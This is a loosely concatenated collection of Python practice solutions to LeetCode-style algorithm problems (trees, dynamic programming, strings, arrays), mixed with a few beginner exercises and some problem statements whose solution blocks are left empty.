
```py


class Solution(object):
    def isBoomerang(self, points):
        """
        :type points: List[List[int]]
        :rtype: bool
        """
        x1, x2, x3, y1, y2, y3 = (
            points[0][0],
            points[1][0],
            points[2][0],
            points[0][1],
            points[1][1],
            points[2][1],
        )
        if (y3 - y2) * (x2 - x1) == (y2 - y1) * (x3 - x2):
            return False
        return True

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution:
    def maxDepth(self, root):
        """
        :type root: TreeNode
        :rtype: int
        """
        if not root:
            return 0
        return 1 + max(self.maxDepth(root.left), self.maxDepth(root.right))

class Solution:
    def isRobotBounded(self, instructions: str) -> bool:
        x, y, dx, dy = 0, 0, 0, 1
        for instruction in instructions:
            if instruction == "G":
                x += dx
                y += dy
            elif instruction == "L":
                dx, dy = -dy, dx
            elif instruction == "R":
                dx, dy = dy, -dx

        return (x, y) == (0, 0) or (dx, dy) != (0, 1)
````

````py
Given an integer array A, you partition the array into (contiguous) subarrays of length at most K.  After partitioning, each subarray has their values changed to become the maximum value of that subarray.

Return the largest sum of the given array after partitioning.



Example 1:

Input: A = [1,15,7,9,2,5,10], K = 3
Output: 84
Explanation: A becomes [15,15,15,9,10,10,10]


Note:

1 <= K <= A.length <= 500
0 <= A[i] <= 10^6```


```py


class Solution(object):
    def maxSumAfterPartitioning(self, A, K):
        """
        :type A: List[int]
        :type K: int
        :rtype: int
        """
        if not A:
            return 0

        N = len(A)
        dp = [0] * (N + 1)
        for index_i in range(N):
            maxi = 0
            for index_j in range(index_i, index_i - K, -1):
                if index_j >= 0 and index_j < len(A):
                    maxi = max(maxi, A[index_j])

                    dp[index_i + 1] = max(
                        dp[index_i + 1], maxi * (index_i - index_j + 1) + dp[index_j]
                    )
            # print index_i, maxi
            # print dp

        return dp[-1]

class Solution:
    def removeDuplicates(self, S: str) -> str:
        if len(S) < 2:
            return S
        i = 0
        result = [""] * len(S)
        for j in range(len(S)):
            result[i] = S[j]
            if i > 0 and result[i - 1] == result[i]:
                i -= 2
            i += 1
        return "".join(result[:i])

# Definition for a binary tree node.
class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


# time: O(nlogn)
# space: O(n)
class Solution:
    def buildTree(self, preorder, inorder):
        """
        :type preorder: List[int]
        :type inorder: List[int]
        :rtype: TreeNode
        """
        inorderDict = {num: i for i, num in enumerate(inorder)}
        pre = iter(preorder)

        def helper(start, end):
            if start > end:
                return None
            val = next(pre)
            root = TreeNode(val)
            idx = inorderDict[val]
            root.left = helper(start, idx - 1)
            root.right = helper(idx + 1, end)
            return root

        return helper(0, len(inorder) - 1)
````

````py
Students are asked to stand in non-decreasing order of heights for an annual photo.

Return the minimum number of students not standing in the right positions.  (This is the number of students that must move in order for all students to be standing in non-decreasing order of height.)



Example 1:

Input: [1,1,4,2,1,3]
Output: 3
Explanation:
Students with heights 4, 3 and the last 1 are not standing in the right positions.


Note:

1 <= heights.length <= 100
1 <= heights[i] <= 100```


```py


class Solution(object):
    def heightChecker(self, heights):
        """
        :type heights: List[int]
        :rtype: int
        """
        result = 0
        for new_h, hei in zip(heights, sorted(heights)):
            if new_h != hei:
                result += 1
        return result
````

````py
Given an array A of positive integers (not necessarily distinct), return the lexicographically largest permutation that is smaller than A, that can be made with one swap (A swap exchanges the positions of two numbers A[i] and A[j]).  If it cannot be done, then return the same array.



Example 1:

Input: [3,2,1]
Output: [3,1,2]
Explanation: Swapping 2 and 1.
Example 2:

Input: [1,1,5]
Output: [1,1,5]
Explanation: This is already the smallest permutation.
Example 3:

Input: [1,9,4,6,7]
Output: [1,7,4,6,9]
Explanation: Swapping 9 and 7.
Example 4:

Input: [3,1,1,3]
Output: [1,3,1,3]
Explanation: Swapping 1 and 3.


Note:

1 <= A.length <= 10000
1 <= A[i] <= 10000```


```py


class Solution(object):
    def prevPermOpt1(self, A):
        """
        :type A: List[int]
        :rtype: List[int]
        """

        left, right = len(A) - 2, len(A) - 1
        for left in range(len(A) - 2, -1, -1):
            if A[left] > A[left + 1]:
                break
        else:
            return A
        right = A.index(max(ele for ele in A[left + 1 :] if ele < A[left]), left)
        A[left], A[right] = A[right], A[left]
        return A
````

````py
In a warehouse, there is a row of barcodes, where the i-th barcode is barcodes[i].

Rearrange the barcodes so that no two adjacent barcodes are equal.  You may return any answer, and it is guaranteed an answer exists.



Example 1:

Input: [1,1,1,2,2,2]
Output: [2,1,2,1,2,1]
Example 2:

Input: [1,1,1,1,2,2,3,3]
Output: [1,3,1,3,2,1,2,1]


Note:

1 <= barcodes.length <= 10000
1 <= barcodes[i] <= 10000```


```py


class Solution(object):
    def rearrangeBarcodes(self, barcodes):
        """
        :type barcodes: List[int]
        :rtype: List[int]
        """
        import heapq

        di = collections.Counter(barcodes)
        pq = [(-value, key) for key, value in di.items()]
        heapq.heapify(pq)
        # print pq
        result = []
        while len(pq) >= 2:
            freq1, barcode1 = heapq.heappop(pq)
            freq2, barcode2 = heapq.heappop(pq)
            result.extend([barcode1, barcode2])

            if freq1 + 1:
                heapq.heappush(pq, (freq1 + 1, barcode1))
            if freq2 + 1:
                heapq.heappush(pq, (freq2 + 1, barcode2))

        if pq:
            result.append(pq[0][1])

        return result

class Solution:
    def leadsToDestination(
        self, n: int, edges: List[List[int]], source: int, destination: int
    ) -> bool:
        neighbors, visited = defaultdict(set), set()
        for edge in edges:
            start, end = edge[0], edge[1]
            neighbors[start].add(end)

        def dfs(node):
            if node == destination and len(neighbors[node]) == 0:
                return True
            elif len(neighbors[node]) == 0:
                return False
            else:
                visited.add(node)
                for n in neighbors[node]:
                    if n == node or n in visited or not dfs(n):
                        return False
                visited.discard(node)
                return True

        return dfs(source)

# Definition for a binary tree node.
class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Solution:
    def buildTree(self, inorder, postorder):
        """
        :type inorder: List[int]
        :type postorder: List[int]
        :rtype: TreeNode
        """
        inorderDict = {num: i for i, num in enumerate(inorder)}

        def helper(start, end):
            if start > end:
                return None
            rootVal = postorder.pop()
            root = TreeNode(rootVal)
            idx = inorderDict[rootVal]
            root.right = helper(idx + 1, end)
            root.left = helper(start, idx - 1)
            return root

        return helper(0, len(inorder) - 1)

class Solution:
    def missingElement(self, nums: List[int], k: int) -> int:
        missing = nums[-1] - nums[0] - len(nums) + 1
        if missing < k:
            return nums[-1] + k - missing
        left, right = 0, len(nums) - 1
        while left + 1 < right:
            mid = left + (right - left) // 2
            missing = nums[mid] - nums[left] - (mid - left)
            if missing < k:
                left = mid
                k -= missing
            else:
                right = mid
        return nums[left] + k
````

````py
Given an array A of distinct integers sorted in ascending order, return the smallest index i that satisfies A[i] == i.  Return -1 if no such i exists.



Example 1:

Input: [-10,-5,0,3,7]
Output: 3
Explanation:
For the given array, A[0] = -10, A[1] = -5, A[2] = 0, A[3] = 3, thus the output is 3.
Example 2:

Input: [0,2,5,8,17]
Output: 0
Explanation:
A[0] = 0, thus the output is 0.
Example 3:

Input: [-10,-5,3,4,7,9]
Output: -1
Explanation:
There is no such i that A[i] = i, thus the output is -1.```


```py


class Solution(object):
    def fixedPoint(self, A):
        """
        :type A: List[int]
        :rtype: int
        """
        if not A:
            return -1
        for index, num in enumerate(A):
            if num == index:
                return index
        return -1

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None

from collections import deque


class Solution:
    def levelOrderBottom(self, root):
        """
        :type root: TreeNode
        :rtype: List[List[int]]
        """
        if not root:
            return []
        queue, res = deque([(root, 1)]), []
        while queue:
            node, level = queue.popleft()
            if level > len(res):
                res = [[]] + res
            res[-level].append(node.val)
            if node.left:
                queue.append((node.left, level + 1))
            if node.right:
                queue.append((node.right, level + 1))
        return res
````

```py
For strings S and T, we say "T divides S" if and only if S = T + ... + T  (T concatenated with itself 1 or more times)

Return the largest string X such that X divides str1 and X divides str2.



Example 1:

Input: str1 = "ABCABC", str2 = "ABC"
Output: "ABC"
Example 2:

Input: str1 = "ABABAB", str2 = "ABAB"
Output: "AB"
Example 3:

Input: str1 = "LEET", str2 = "CODE"
Output: ""


Note:

1 <= str1.length <= 1000
1 <= str2.length <= 1000
str1[i] and str2[i] are English uppercase letters.
```

```py


class Solution(object):
    def gcdOfStrings(self, str1, str2):
        """
        :type str1: str
        :type str2: str
        :rtype: str
        """
        if len(str1) > len(str2):
            str1, str2 = str2, str1

        l_str1 = len(str1)
        for index in range(1, len(str1) + 1):
            if l_str1 % index != 0:
                continue

            size_to_take = int(l_str1 / index)
            substr1 = str1[:size_to_take]
            substr2 = str2

            while substr1 == substr2[:size_to_take]:
                substr2 = substr2[size_to_take:]

            if substr2 == "":
                return substr1
        return ""
```

````py
Given a matrix consisting of 0s and 1s, we may choose any number of columns in the matrix and flip every cell in that column.  Flipping a cell changes the value of that cell from 0 to 1 or from 1 to 0.

Return the maximum number of rows that have all values equal after some number of flips.



Example 1:

Input: [[0,1],[1,1]]
Output: 1
Explanation: After flipping no values, 1 row has all values equal.
Example 2:

Input: [[0,1],[1,0]]
Output: 2
Explanation: After flipping values in the first column, both rows have equal values.
Example 3:

Input: [[0,0,0],[0,0,1],[1,1,0]]
Output: 2
Explanation: After flipping values in the first two columns, the last two rows have equal values.


Note:

1 <= matrix.length <= 300
1 <= matrix[i].length <= 300
All matrix[i].length's are equal
matrix[i][j] is 0 or 1```


```py
````

````py
Given two numbers arr1 and arr2 in base -2, return the result of adding them together.

Each number is given in array format:  as an array of 0s and 1s, from most significant bit to least significant bit.  For example, arr = [1,1,0,1] represents the number (-2)^3 + (-2)^2 + (-2)^0 = -3.  A number arr in array format is also guaranteed to have no leading zeros: either arr == [0] or arr[0] == 1.

Return the result of adding arr1 and arr2 in the same format: as an array of 0s and 1s with no leading zeros.



Example 1:

Input: arr1 = [1,1,1,1,1], arr2 = [1,0,1]
Output: [1,0,0,0,0]
Explanation: arr1 represents 11, arr2 represents 5, the output represents 16.


Note:

1 <= arr1.length <= 1000
1 <= arr2.length <= 1000
arr1 and arr2 have no leading zeros
arr1[i] is 0 or 1
arr2[i] is 0 or 1```


```py
````

````py
Given a matrix, and a target, return the number of non-empty submatrices that sum to target.

A submatrix x1, y1, x2, y2 is the set of all cells matrix[x][y] with x1 <= x <= x2 and y1 <= y <= y2.

Two submatrices (x1, y1, x2, y2) and (x1', y1', x2', y2') are different if they have some coordinate that is different: for example, if x1 != x1'.



Example 1:

Input: matrix = [[0,1,0],[1,1,1],[0,1,0]], target = 0
Output: 4
Explanation: The four 1x1 submatrices that only contain 0.
Example 2:

Input: matrix = [[1,-1],[-1,1]], target = 0
Output: 5
Explanation: The two 1x2 submatrices, plus the two 2x1 submatrices, plus the 2x2 submatrix.


Note:

1 <= matrix.length <= 300
1 <= matrix[0].length <= 300
-1000 <= matrix[i] <= 1000
-10^8 <= target <= 10^8```


```py
````

````py
You have a set of tiles, where each tile has one letter tiles[i] printed on it.  Return the number of possible non-empty sequences of letters you can make.



Example 1:

Input: "AAB"
Output: 8
Explanation: The possible sequences are "A", "B", "AA", "AB", "BA", "AAB", "ABA", "BAA".
Example 2:

Input: "AAABBC"
Output: 188```


```py


class Solution(object):
    def numTilePossibilities(self, tiles):
        """
        :type tiles: str
        :rtype: int
        """

        if not tiles:
            return 0

        import collections

        unique = set(tiles)
        freq_map = collections.Counter(tiles)
        total_len = 1
        while total_len < len(tiles):
            new = set()
            for char in tiles:
                for comb in unique:
                    new_seq = comb + char
                    up_freq = collections.Counter(new_seq)
                    flag = True
                    for key, val in up_freq.items():
                        if val > freq_map[key]:
                            flag = False
                    if flag:
                        new.add(new_seq)
            # print new
            unique.update(new)

            total_len += 1
        return len(unique)

# time: O(n)
# space O(logn)
# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def sortedArrayToBST(self, nums: List[int]) -> TreeNode:
        return self.dfs(0, len(nums) - 1, nums)

    def dfs(self, low, high, nums):
        if low > high:
            return None
        m = low + (high - low) // 2
        root = TreeNode(nums[m])
        root.left = self.dfs(low, m - 1, nums)
        root.right = self.dfs(m + 1, high, nums)
        return root
````

````py
Return the lexicographically smallest subsequence of text that contains all the distinct characters of text exactly once.


Example 1:

Input: "cdadabcc"
Output: "adbc"
Example 2:

Input: "abcd"
Output: "abcd"
Example 3:

Input: "ecbacba"
Output: "eacb"
Example 4:

Input: "leetcode"
Output: "letcod"


Note:

1 <= text.length <= 1000
text consists of lowercase English letters.```


```py


class Solution(object):
    def smallestSubsequence(self, text):
        """
        :type text: str
        :rtype: str
        """
        if not text:
            return ""
        import collections

        freq_map = collections.Counter(text)
        used = [False] * 26
        result = ""

        for char in text:
            freq_map[char] -= 1
            if used[ord(char) - 97]:
                continue
            while result and result[-1] > char and freq_map[result[-1]] > 0:
                used[ord(result[-1]) - 97] = False
                result = result[:-1]

            used[ord(char) - 97] = True
            result += char
        return result
````

````py
Given an array A of positive integers, let S be the sum of the digits of the minimal element of A.

Return 0 if S is odd, otherwise return 1.



Example 1:

Input: [34,23,1,24,75,33,54,8]
Output: 0
Explanation:
The minimal element is 1, and the sum of those digits is S = 1 which is odd, so the answer is 0.
Example 2:

Input: [99,77,33,66,55]
Output: 1
Explanation:
The minimal element is 33, and the sum of those digits is S = 3 + 3 = 6 which is even, so the answer is 1.


Note:

1 <= A.length <= 100
1 <= A[i].length <= 100```


```py


class Solution(object):
    def sumOfDigits(self, A):
        """
        :type A: List[int]
        :rtype: int
        """
        if not A:
            return 0

        mini = min(A)
        result = 0
        while mini > 0:
            quo = mini % 10
            rem = mini / 10
            result += quo
            mini = rem

        return 0 if result % 2 else 1
````

````py
Given a fixed length array arr of integers, duplicate each occurrence of zero, shifting the remaining elements to the right.

Note that elements beyond the length of the original array are not written.

Do the above modifications to the input array in place, do not return anything from your function.



Example 1:

Input: [1,0,2,3,0,4,5,0]
Output: null
Explanation: After calling your function, the input array is modified to: [1,0,0,2,3,0,0,4]
Example 2:

Input: [1,2,3]
Output: null
Explanation: After calling your function, the input array is modified to: [1,2,3]


Note:

1 <= arr.length <= 10000
0 <= arr[i] <= 9```


```py


class Solution(object):
    def duplicateZeros(self, arr):
        """
        :type arr: List[int]
        :rtype: None Do not return anything, modify arr in-place instead.
        """
        arr_copy = arr[:]
        index, n = 0, len(arr_copy)
        for elem in arr_copy:
            arr[index] = elem
            index += 1
            if index >= n:
                break
            if elem == 0:
                arr[index] = elem
                index += 1
                if index >= n:
                    break

# Definition for singly-linked list.
# class ListNode:
#     def __init__(self, x):
#         self.val = x
#         self.next = None

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None

# time: O(nlogn)
# space: O(nlogn)
class Solution:
    def sortedListToBST(self, head):
        """
        :type head: ListNode
        :rtype: TreeNode
        """
        return self.dfs(head, None)

    def dfs(self, head, tail):
        if head == tail:
            return None
        slow, fast = head, head
        while fast != tail and fast.next != tail:
            fast = fast.next.next
            slow = slow.next
        root = TreeNode(slow.val)
        root.left = self.dfs(head, slow)
        root.right = self.dfs(slow.next, tail)
        return root

class Solution:
    def carPooling(self, trips: List[List[int]], capacity: int) -> bool:
        space = 0
        for s, c in sorted(
            x for trip in trips for x in [(trip[1], trip[0]), (trip[2], -trip[0])]
        ):
            space += c
            if space > capacity:
                return False
        return True

from typing import List


class Solution:
    def twoSumLessThanK(self, A: List[int], K: int) -> int:
        A.sort()
        result = -1
        l, r = 0, len(A) - 1
        while l < r:
            if A[l] + A[r] < K:
                result = max(result, A[l] + A[r])
                l += 1
            else:
                r -= 1
        return result

def commonCharacterCount(s1, s2):
    count = 0
    word2 = list(s2)
    for letter in s1:
        if letter in word2:
            word2.remove(letter)
            count += 1
    return count

import fnmatch
import os

# constants
PATH = "./"
PATTERN = "*.md"


def get_file_names(filepath, pattern):
    matches = []
    if os.path.exists(filepath):
        for root, dirnames, filenames in os.walk(filepath):
            for filename in fnmatch.filter(filenames, pattern):
                # matches.append(os.path.join(root, filename))  # full path
                matches.append(os.path.join(filename))  # just file name
        if matches:
            print("Found {} files:".format(len(matches)))
            output_files(matches)
        else:
            print("No files found.")
    else:
        print("Sorry that path does not exist. Try again.")


def output_files(list_of_files):
    for filename in list_of_files:
        print(filename)


if __name__ == "__main__":
    get_file_names(PATH, PATTERN)

# Write a function is_even that will return true if the passed-in number is even.


def is_even(n):
    return n % 2 == 0


# Read a number from the keyboard
num = input("Enter a number: ")
num = int(num)

# Print out "Even!" if the number is even. Otherwise print "Odd"

if is_even(num):
    print("Even!")
else:
    print("Odd")

import sys

sys.setrecursionlimit(1000)
n = 40

# use space in a linear format
# while n != 0: # O(n)
#     print(n)
#     n -= 1

# def rec_while(n): # O(n)
#     # base case
#     if n == 0:
#         return
#     # logic that we want to do
#     print(n)
#     rec_while(n - 1)

# rec_while(n)


def fib(n):
    if n < 2:
        return 1
    return fib(n - 1) + fib(n - 2)


print(fib(n))

def isLucky(n):
    string = str(n)
    top = [int(x) for x in string[: len(string) // 2]]
    bottom = [int(x) for x in string[len(string) // 2 :]]
    return sum(top) == sum(bottom)

# Max Inserts to Obtain String Without 3 Consecutive 'a'

# Write a function solution that, given a string S
# consisting of N characters, returns the maximum
# number of letters 'a' that can be inserted into
# S (including at the front and end of S) so that
# the resulting string doesn't contain 3 consecutive
# letters 'a'.

# If string S already contains the substring "aaa", then
# your function should return -1.
````

````py
Examples:
1. Given S = "aabab", the function should return 3,
    because a string "aabaabaa" can be made.
2. Given S = "dog", the function should return 8,
    because a string "aadaaoaagaa" can be made.
3. Given S = "aa", the function should return 0,
    because no longer string can be made.
4. Given S= "baaaa", the function should return -1,
    because there is a substring "aaa".```


```py

# time complexity:  O()
# space complexity:  O()

# Sets
# - declare
# - union, intersection, symmetric_difference, difference
# - Examples
# -- unique tags
# -- users taking two actions

posts = [
    {"title": "All About Lists", "tags": ("fun", "informative", "lists")},
    {"title": "Tuple Trouble", "tags": ("fun", "tuples")},
    {"title": "Sparkling Sets", "tags": ("informative", "numbers")},
]

allTags = []
for i in range(len(posts)):
    print(posts[i]["tags"])
    allTags.extend(posts[i]["tags"])

print(allTags)
allTags = list(set(allTags))
allTags.sort()
print(allTags)
````

```py
 Given n non-negative integers a1, a2, ..., an, where each represents a point at coordinate (i, ai). n vertical lines are drawn such that the two endpoints of line i is at (i, ai) and (i, 0). Find two lines, which together with x-axis forms a container, such that the container contains the most water.

 Note: You may not slant the container and n is at least 2.
```

```py


class Solution(object):
    def maxArea(self, height):
        """
        :type height: List[int]
        :rtype: int
        """
        left, right, maxArea = 0, len(height) - 1, 0

        while left < right:
            maxArea = max(maxArea, min(height[left], height[right]) * (right - left))
            if height[left] < height[right]:
                left += 1
            else:
                right -= 1

        return maxArea


# Space : O(1)
# Time: O(N)

# time: O(n)
# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def isBalanced(self, root: TreeNode) -> bool:
        return self.dfs(root) != -1

    def dfs(self, node):
        if not node:
            return 0
        left = self.dfs(node.left)
        right = self.dfs(node.right)
        if left == -1 or right == -1 or abs(left - right) > 1:
            return -1
        return max(left, right) + 1

class Solution:
    def distributeCandies(self, candies: int, num_people: int) -> List[int]:
        result = [0] * num_people
        give = 0
        given_candies = 0
        while given_candies < candies:
            result[give % num_people] += min(candies - given_candies, give + 1)
            give += 1
            given_candies += give
        return result

class Solution:
    def corpFlightBookings(self, bookings: List[List[int]], n: int) -> List[int]:
        result = [0] * n
        for i, j, v in bookings:
            result[i - 1] += v
            if j < n:
                result[j] += -v
        for i in range(1, n):
            result[i] += result[i - 1]
        return result
```

````py
 Given a binary tree, find its minimum depth.

 The minimum depth is the number of nodes along the shortest path from the root node down to the nearest leaf node.

 Note: A leaf is a node with no children.

 Example:

 Given binary tree [3,9,20,null,null,15,7],

     3
    / \
   9  20
     /  \
    15   7

 return its minimum depth = 2.```


```py

# Definition for a binary tree node.
# class TreeNode(object):
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution(object):
    def minDepth(self, root):
        if not root:
            return 0
        depth = float("inf")
        stack = [(root, 1)]

        while stack:
            node, level = stack.pop()
            if node:

                if not node.left and not node.right:
                    depth = min(depth, level)

                stack.append((node.left, level + 1))
                stack.append((node.right, level + 1))

        return depth

from threading import Barrier, Semaphore


class H2O:
    def __init__(self):
        self.b = Barrier(3)
        self.h = Semaphore(2)
        self.o = Semaphore(1)

    def hydrogen(self, releaseHydrogen: "Callable[[], None]") -> None:
        with self.h:
            self.b.wait()
            # releaseHydrogen() outputs "H". Do not change or remove this line.
            releaseHydrogen()

    def oxygen(self, releaseOxygen: "Callable[[], None]") -> None:
        with self.o:
            self.b.wait()
            # releaseOxygen() outputs "O". Do not change or remove this line.
            releaseOxygen()

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None

# time: O(n)
class Solution:
    def hasPathSum(self, root, sum):
        """
        :type root: TreeNode
        :type sum: int
        :rtype: bool
        """
        if not root:
            return False
        if not root.left and not root.right and root.val == sum:
            return True
        return self.hasPathSum(root.left, sum - root.val) or self.hasPathSum(
            root.right, sum - root.val
        )

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def lcaDeepestLeaves(self, root: TreeNode) -> TreeNode:
        def dfs(node):
            if not node:
                return 0, None
            h1, lca1 = dfs(node.left)
            h2, lca2 = dfs(node.right)
            if h1 > h2:
                return h1 + 1, lca1
            if h2 > h1:
                return h2 + 1, lca2
            # as h1 is equal to h2, we can return either of them and the root node
            return h1 + 1, node

        return dfs(root)[1]

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def pathSum(self, root: TreeNode, sum: int) -> List[List[int]]:
        result = []
        self.dfs(root, sum, [], result)
        return result

    def dfs(self, node, sum, path, result):
        if not node:
            return
        if not node.left and not node.right and node.val == sum:
            result.append(path + [node.val])
            return
        self.dfs(node.left, sum - node.val, path + [node.val], result)
        self.dfs(node.right, sum - node.val, path + [node.val], result)

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None

# time: O(n)
# space: O(1)


class Solution:
    def flatten(self, root):
        """
        :type root: TreeNode
        :rtype: void Do not return anything, modify root in-place instead.
        """
        while root:
            if not root.right:
                root.left, root.right = root.right, root.left
            elif root.left:
                root.left, root.right = root.right, root.left
                it = root
                while it.right:
                    it = it.right
                root.left, it.right = it.right, root.left
            root = root.right

class Solution:
    def numDistinct(self, s, t):
        """
        :type s: str
        :type t: str
        :rtype: int
        """
        m, n = len(s), len(t)
        dp = [[0] * (n + 1) for _ in range(m + 1)]
        for i in range(m + 1):
            dp[i][0] = 1
        for j in range(1, n + 1):
            dp[0][j] = 0
        for i in range(1, m + 1):
            for j in range(1, n + 1):
                if s[i - 1] == t[j - 1]:
                    dp[i][j] = dp[i - 1][j - 1] + dp[i - 1][j]
                else:
                    dp[i][j] = dp[i - 1][j]
        return dp[m][n]

class Solution:
    def canConvert(self, str1: str, str2: str) -> bool:
        if str1 == str2:
            return True
        d = {}
        for i in range(len(str1)):
            c1, c2 = str1[i], str2[i]
            if c1 in d and d[c1] != c2:
                return False
            d[c1] = c2
        return len(set(str2)) < 26
````

````py
# Definition for a Node.
class Node:
    def __init__(self, val: int = 0, left: 'Node' = None, right: 'Node' = None, next: 'Node' = None):
        self.val = val
        self.left = left
        self.right = right
        self.next = next```


```py


class Solution:
    def connect(self, root: "Node") -> "Node":
        if not root:
            return None
        dummy = root
        queue = [root]
        while queue:
            node = queue.pop()
            if node.right:
                if node.next:
                    node.right.next = node.next.left
                queue.append(node.right)
            if node.left:
                node.left.next = node.right
                queue.append(node.left)
        return dummy
````

````py
# Definition for a Node.
class Node:
    def __init__(self, val: int = 0, left: 'Node' = None, right: 'Node' = None, next: 'Node' = None):
        self.val = val
        self.left = left
        self.right = right
        self.next = next```


```py


class Solution:
    def connect(self, root: "Node") -> "Node":
        if not root:
            return None
        result = curr = root
        head = root
        while head:
            curr = head
            head = None
            prev = None
            while curr:
                if curr.left:
                    if prev:
                        prev.next = curr.left
                    else:
                        head = curr.left
                    prev = curr.left
                if curr.right:
                    if prev:
                        prev.next = curr.right
                    else:
                        head = curr.right
                    prev = curr.right
                curr = curr.next
        return result

class Solution:
    def generate(self, numRows: int) -> List[List[int]]:
        if numRows == 0:
            return []
        if numRows == 1:
            return [[1]]
        s0 = [1]
        result = [s0]
        for i in range(1, numRows):
            s = [x + y for x, y in zip([0] + s0, s0 + [0])]
            result.append(s)
            s0 = s
        return result
````

````py
Given a string text, you want to use the characters of text to form as many instances of the word "balloon" as possible.
You can use each character in text at most once. Return the maximum number of instances that can be formed.


Example 1:
Input: text = "nlaebolko"
Output: 1

Example 2:
Input: text = "loonbalxballpoon"
Output: 2

Example 3:
Input: text = "leetcode"
Output: 0


Constraints:

1 <= text.length <= 10^4
text consists of lower case English letters only.```


```py


class Solution(object):
    def maxNumberOfBalloons(self, text):
        """
        :type text: str
        :rtype: int
        """
        if not text:
            return 0

        import collections

        cnt = collections.Counter(text)
        cnt_ballon = collections.Counter("balloon")

        return min([cnt[c] // cnt_ballon[c] for c in cnt_ballon])

class Solution:
    def getRow(self, rowIndex: int) -> List[int]:
        if rowIndex == 0:
            return [1]
        s = [1]
        for i in range(1, rowIndex + 1):
            s = [sum(x) for x in zip([0] + s, s + [0])]
        return s

class Solution:
    def reverseParentheses(self, s: str) -> str:
        s = list(s)
        stack = []
        result = ""
        for i in range(len(s)):
            if s[i] == "(":
                stack.append(i)
            elif s[i] == ")":
                prev = stack.pop()
                s[prev : i + 1] = s[prev : i + 1][::-1]
        return "".join(i for i in s if i not in {"(", ")"})

# 11. Write a Python Program to take in a person's age and check if he/she is eligible to vote or not

age = int(input("Enter the age of the person: "))

if age >= 18:
    print("Person can vote")
else:
    print("Person cannot vote")

def isLucky(n):
    string = str(n)
    top = [int(x) for x in string[: len(string) // 2]]
    bottom = [int(x) for x in string[len(string) // 2 :]]
    return sum(top) == sum(bottom)

# Stacks and Queues
# - interruption stack
# - processing queue

teller = []

teller.append("Greet Customer")
print(teller)
teller.pop()
print(teller)
teller.append("Process Deposit")
print(teller)
teller.append("Phone Ringing")
print(teller)
teller.pop()
teller.append("Greet Caller, Listen, Answer Question")
print(teller)
teller.pop()
print(teller)
teller.pop()
print(teller)

# processor = []
# processor.append({'type':'page','path':'','header':[],'cookies':[]}),
# processor.append({'type':'api', 'function':'', 'parameters':[]})
# processor.append({'email':'email','address':'bob@gmail.com','subject':''})
# print("PROCESSOR LIST", processor)

# for i in range(len(processor)):
#     item = processor.pop(0)
#     print("PROCESSING ITEM", item)
#     print("REMAINING LIST", processor)

def sortByHeight(a):
    treePositions = [x for x in range(len(a)) if a[x] == -1]
    people = sorted([x for x in a if x != -1])
    for tree in treePositions:
        people.insert(tree, -1)
    return people

# Processing Lists
# - any, all
# - filter
# - map
# - zip
# - custom sort

print("all() - any item that is false")
titles1 = ["Mr", "Mrs", "Ms"]
titles2 = ["Mr", "Mrs", "Ms", ""]
titles3 = []
print(all(titles1), titles1)
print(all(titles2), titles2)
print(all(titles3), titles3)

print("any() - looking for any item to be true")
feedback1 = ["", "", "", ""]
feedback2 = ["So much fun!", "", "", ""]
feedback3 = []
print(any(feedback1), feedback1)
print(any(feedback2), feedback2)
print(any(feedback3), feedback3)

# down-top


class Solution:
    def minimumTotal(self, triangle):
        """
        :type triangle: List[List[int]]
        :rtype: int
        """
        dp = [0] * (len(triangle) + 1)
        for row in triangle[::-1]:
            for j in range(len(row)):
                dp[j] = min(dp[j], dp[j + 1]) + row[j]
        return dp[0]
````

````py
Given an array of distinct integers arr, find all pairs of elements with the minimum absolute difference of any two elements.

Return a list of pairs in ascending order(with respect to pairs), each pair [a, b] follows

a, b are from arr
a < b
b - a equals to the minimum absolute difference of any two elements in arr


Example 1:

Input: arr = [4,2,1,3]
Output: [[1,2],[2,3],[3,4]]
Explanation: The minimum absolute difference is 1. List all pairs with difference equal to 1 in ascending order.
Example 2:

Input: arr = [1,3,6,10,15]
Output: [[1,3]]
Example 3:

Input: arr = [3,8,-10,23,19,-4,-14,27]
Output: [[-14,-10],[19,23],[23,27]]


Constraints:

2 <= arr.length <= 10^5
-10^6 <= arr[i] <= 10^6```


```py


class Solution(object):
    def minimumAbsDifference(self, arr):
        """
        :type arr: List[int]
        :rtype: List[List[int]]
        """
        if not arr:
            return []

        arr.sort()
        mindiff = arr[1] - arr[0]
        for index in range(2, len(arr)):
            mindiff = min(mindiff, (arr[index] - arr[index - 1]))

        result = []
        for index in range(1, len(arr)):
            if arr[index] - arr[index - 1] == mindiff:
                result.append([arr[index - 1], arr[index]])
        return result

class Solution:
    def maxProfit(self, prices: List[int]) -> int:
        if not prices or len(prices) < 2:
            return 0
        ret = 0
        buy = prices[0]
        for price in prices[1:]:
            buy = min(price, buy)
            ret = max(ret, price - buy)
        return ret

class Solution:
    def isValidPalindrome(self, s: str, k: int) -> bool:
        prev, n = [0], len(s)
        for i in range(n):
            prev.append(prev[i] + 1)

        s2 = s[::-1]
        for i in range(n):
            curr = [i + 1]
            for j in range(n):
                if s[i] == s2[j]:
                    curr.append(prev[j])
                else:
                    curr.append(1 + min(prev[j + 1], curr[j]))
            prev = curr
        return prev[n] <= 2 * k

class Solution:
    def maxProfit(self, prices: List[int]) -> int:
